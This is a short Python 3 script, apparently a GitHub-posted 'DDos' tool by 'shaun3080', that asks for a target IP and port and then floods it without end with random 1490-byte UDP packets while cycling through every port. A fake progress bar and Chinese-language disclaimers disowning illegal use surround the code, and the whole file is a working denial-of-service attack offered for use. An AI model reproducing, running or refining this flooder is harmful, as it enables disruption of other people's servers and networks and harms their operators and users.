# python3

import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
##############

os.system("clear")
os.system("figlet SHAUN3080 DDos")
print (" ")
print ("Author  :not")
print("github   : https://github.com/shaun3080")
print ("作者    : Shaun ")
print (" ")
print("\033[31m如有犯法，本人概不负责\033[0m")
print (" -----------------[请勿用于违法用途]----------------- ")
print ("维权保护，使用请@博主谢谢 ")
print ("目前只有PYTHON3支持 ")
print (" ")
print (" ")
ip = input("IP 地址 : ")
port = input("端口号       : ")
port = int(port)

os.system("clear")
os.system("figlet SHAUN3080 DDos")
print ("Please give me some time, I need to buffer and load the file, the process is about 40 seconds, thanks for the cooperation. ")
print("[                    ] 0% ")
time.sleep(8)
print("[=====               ] 25%")
time.sleep(8)
print("[==========          ] 50%")
time.sleep(8)
print("[===============     ] 75%")
time.sleep(8)
print("[====================] 100%")
time.sleep(8)
print ("Replicating")
time.sleep(10)
print ("All work is ready to be completed!")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print("已发送 %s 数据包 %s 通过端口:%s"%(sent,ip,port))
     if port == 65534:
       port = 1

